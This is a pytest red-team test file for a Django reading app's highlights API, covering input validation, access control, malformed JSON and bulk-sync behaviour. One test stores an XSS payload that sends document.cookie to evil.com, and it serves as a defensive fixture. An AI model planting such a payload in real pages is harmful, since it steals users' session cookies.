"""
RED TEAM: Highlights / Journal Adversarial Tests.

Tests Highlight model and APIs at /api/reader/highlights/

P0 = crash/security | P1 = data loss | P2 = wrong behavior | P3 = UX/error handling
"""

import json
import pytest
from django.test import Client

from apps.documents.models import Document
from apps.reader.models import Highlight
from apps.users.models import User


@pytest.fixture
def user(db):
    return User.objects.create(email="highlights_redteam@test.com")


@pytest.fixture
def client(user):
    c = Client()
    c.force_login(user)
    return c


@pytest.fixture
def document(db, user):
    return Document.objects.create(
        user=user,
        title="Highlight Test Doc",
        file_key="uploads/99/highlight_test.pdf",
        file_type=Document.FILE_TYPE_PDF,
        status=Document.STATUS_READY,
        raw_text="Chapter One: The Beginning\n\nThis is paragraph one. " * 20,
        page_count=5,
        word_count=200,
    )


# =============================================================================
# P0 — SECURITY / CRASH TESTS
# =============================================================================

@pytest.mark.django_db
class TestHighlightsP0:
    """Security and crash tests for highlights."""

    def test_highlight_negative_start_index__P0(self, client, document):
        """SCORE: P0 — Negative start_index is a PositiveIntegerField (>=0).
        Should be rejected by the database at model level.
        """
        # Try via batch sync API (serializer doesn't validate start_index type)
        response = client.post(
            "/api/reader/highlights/",
            {
                "document_id": document.id,
                "highlights": [
                    {
                        "text": "Test highlight",
                        "startIndex": -999,
                        "color": "#ff0000",
                    }
                ],
            },
            content_type="application/json",
        )
        # If it gets through, it should 500 or the DB should reject it
        assert response.status_code == 400, (
            f"P0: Expected 400 for negative start_index, got {response.status_code}"
        )
        data = response.json()
        assert "startIndex" in str(data), (
            f"P0: Error should mention startIndex, got {data}"
        )

    def test_highlight_extremely_large_start_index__P0(self, client, document):
        """SCORE: P0 — start_index above max PositiveIntegerField."""
        response = client.post(
            "/api/reader/highlights/",
            {
                "document_id": document.id,
                "highlights": [
                    {
                        "text": "Far highlight",
                        "startIndex": 999999999,
                        "color": "#00ff00",
                    }
                ],
            },
            content_type="application/json",
        )
        assert response.status_code != 500, (
            f"P0: Large start_index caused 500"
        )

    def test_highlight_nonexistent_document__P0(self, client):
        """SCORE: P0 — Creating highlight for non-existent document must 404."""
        response = client.post(
            "/api/reader/highlights/",
            {
                "document_id": 99999,
                "highlights": [{"text": "ghost highlight", "startIndex": 0}],
            },
            content_type="application/json",
        )
        assert response.status_code == 404, (
            f"P0 VULN: Highlight for non-existent document returned {response.status_code}"
        )

    def test_highlight_other_users_document__P0(self, client):
        """SCORE: P0 — Cannot create highlight on another user's document."""
        other = User.objects.create(email="other@test.com")
        other_doc = Document.objects.create(
            user=other, title="Other Doc", file_key="other.pdf",
            file_type=Document.FILE_TYPE_PDF, status=Document.STATUS_READY,
        )

        response = client.post(
            "/api/reader/highlights/",
            {
                "document_id": other_doc.id,
                "highlights": [{"text": "stolen highlight", "startIndex": 0}],
            },
            content_type="application/json",
        )
        assert response.status_code == 404, (
            f"P0 VULN: Created highlight on other user's document! Got {response.status_code}"
        )

    def test_highlight_malformed_json__P0(self, client):
        """SCORE: P0 — Malformed JSON should not crash."""
        response = client.post(
            "/api/reader/highlights/",
            "{not valid json @#$%",
            content_type="application/json",
        )
        assert response.status_code != 500, (
            f"P0: Malformed JSON caused 500"
        )
        assert response.status_code in (400, 415), (
            f"P0: Expected 400 for malformed JSON, got {response.status_code}"
        )

    def test_highlight_empty_highlights_array__P0(self, client, document):
        """SCORE: P0 — Syncing empty highlights array should clear all highlights."""
        # First create some highlights
        Highlight.objects.create(
            user=document.user, document=document, text="Existing", start_index=0
        )
        response = client.post(
            "/api/reader/highlights/",
            {"document_id": document.id, "highlights": []},
            content_type="application/json",
        )
        assert response.status_code != 500, f"P0: Empty highlights caused 500"
        if response.status_code == 200:
            data = response.json()
            assert data["synced"] == 0
            # All existing highlights should be deleted
            assert Highlight.objects.filter(document=document).count() == 0, (
                f"P0: Empty sync didn't clear existing highlights"
            )

    def test_highlight_without_document_id__P0(self, client):
        """SCORE: P0 — POST without document_id should error clearly."""
        response = client.post(
            "/api/reader/highlights/",
            {"highlights": [{"text": "no doc", "startIndex": 0}]},
            content_type="application/json",
        )
        assert response.status_code == 400, (
            f"P0: Missing document_id returned {response.status_code}"
        )

    def test_highlight_xss_in_text__P0(self, client, document):
        """SCORE: P0 — XSS payload in highlight text should be stored as-is,
        template escaping should handle rendering."""
        xss_payload = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
        response = client.post(
            "/api/reader/highlights/",
            {
                "document_id": document.id,
                "highlights": [
                    {"text": xss_payload, "startIndex": 0, "color": "#ff0000"}
                ],
            },
            content_type="application/json",
        )
        assert response.status_code != 500, f"P0: XSS highlight caused 500"
        if response.status_code == 200:
            h = Highlight.objects.filter(document=document).first()
            assert h.text == xss_payload, "P0: XSS payload was modified during storage"

    def test_highlight_bulk_overflow__P0(self, client, document):
        """SCORE: P0 — Syncing 10000 highlights should not crash or hang."""
        highlights = []
        for i in range(10000):
            highlights.append({
                "text": f"Highlight {i}",
                "startIndex": i,
                "color": "#fbbf24",
            })

        response = client.post(
            "/api/reader/highlights/",
            {"document_id": document.id, "highlights": highlights},
            content_type="application/json",
        )
        assert response.status_code != 500, (
            f"P0: 10K highlight bulk sync caused 500"
        )
        if response.status_code == 200:
            count = Highlight.objects.filter(document=document).count()
            assert count == 10000, (
                f"P2: Expected 10K highlights, got {count}"
            )


# =============================================================================
# P2 — WRONG BEHAVIOR TESTS
# =============================================================================

@pytest.mark.django_db
class TestHighlightsP2:
    """Tests for incorrect behavior."""

    def test_highlight_list_filters_by_document__P2(self, client, user):
        """SCORE: P2 — GET /highlights/?document=X should filter."""
        doc1 = Document.objects.create(
            user=user, title="Doc 1", file_key="d1.pdf",
            file_type=Document.FILE_TYPE_PDF, status=Document.STATUS_READY,
        )
        doc2 = Document.objects.create(
            user=user, title="Doc 2", file_key="d2.pdf",
            file_type=Document.FILE_TYPE_PDF, status=Document.STATUS_READY,
        )

        h1 = Highlight.objects.create(user=user, document=doc1, text="H1", start_index=0)
        h2 = Highlight.objects.create(user=user, document=doc2, text="H2", start_index=0)

        response = client.get(f"/api/reader/highlights/?document={doc1.id}")
        data = response.json()
        ids = [h["id"] for h in data]
        assert h1.id in ids
        assert h2.id not in ids, "P2: Filter by document not working"

        h1.delete()
        h2.delete()

    def test_highlight_sync_is_replacement_not_append__P2(self, client, document, user):
        """SCORE: P2 — Sync should REPLACE highlights, not append.

        The code does: Highlight.objects.filter(...).delete() then bulk_create.
        """
        # Create some initial highlights
        Highlight.objects.create(user=user, document=document, text="Old", start_index=0)
        Highlight.objects.create(user=user, document=document, text="Old2", start_index=10)

        # Sync new highlights (should replace)
        response = client.post(
            "/api/reader/highlights/",
            {
                "document_id": document.id,
                "highlights": [
                    {"text": "New Only", "startIndex": 5, "color": "#ffffff"}
                ],
            },
            content_type="application/json",
        )
        assert response.status_code == 200

        count = Highlight.objects.filter(document=document).count()
        assert count == 1, (
            f"P2: Sync didn't replace — expected 1 highlight, got {count}"
        )
        assert Highlight.objects.filter(text="New Only").exists(), (
            "P2: New highlight not found after sync"
        )

    def test_highlight_search__P2(self, client, document, user):
        """SCORE: P2 — Search parameter should filter highlights."""
        Highlight.objects.create(user=user, document=document, text="Important concept", start_index=0)
        Highlight.objects.create(user=user, document=document, text="Random note", start_index=10)

        response = client.get("/api/reader/highlights/?search=Important")
        data = response.json()
        assert len(data) >= 1, "P2: Search for 'Important' returned no results"
        texts = [h["text"] for h in data]
        assert any("Important" in t for t in texts), "P2: Search filter not working"


# =============================================================================
# P3 — UX TESTS
# =============================================================================

@pytest.mark.django_db
class TestHighlightsP3:
    """UX and error handling tests."""

    def test_highlight_response_includes_document_title__P3(self, client, document):
        """SCORE: P3 — List response should include document_title."""
        Highlight.objects.create(user=document.user, document=document, text="Test", start_index=0)
        response = client.get("/api/reader/highlights/")
        data = response.json()
        if data:
            assert "document_title" in data[0], "P3: document_title missing from highlight response"

    def test_unauthenticated_highlights__P3(self):
        """SCORE: P3 — Desktop mode auto-authenticates; verify no 500."""
        anon = Client()
        response = anon.get("/api/reader/highlights/")
        assert response.status_code != 500, "P3: Unauthenticated highlights caused 500"
